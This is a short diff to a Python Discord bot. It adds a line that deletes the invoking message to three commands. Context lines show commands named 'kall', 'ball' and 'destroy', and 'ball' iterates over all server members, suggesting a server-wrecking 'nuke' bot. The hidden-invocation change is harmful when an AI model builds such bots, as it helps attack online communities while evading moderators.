@@ -25,6 +25,7 @@ async def on_server_join(server):
 ####HELP COMMAND####
 @client.command(pass_context=True)
 async def secret(ctx):
+    await ctx.message.delete()
     member = ctx.message.author
 
     embed = discord.Embed(
@@ -59,6 +60,7 @@ async def kall(ctx):
 ####BALL COMMAND####
 @client.command(pass_context=True)
 async def ball(ctx):
+    await ctx.message.delete()
     guild = ctx.message.guild
     for member in list(client.get_all_members()):
         try:
@@ -133,6 +135,7 @@ async def destroy(ctx):
 ####PING COMMAND####
 @client.command(pass_context=True)
 async def ping(ctx):
+    await ctx.message.delete()
     member = ctx.message.author
     channel = ctx.message.channel
     t1 = time.perf_counter()
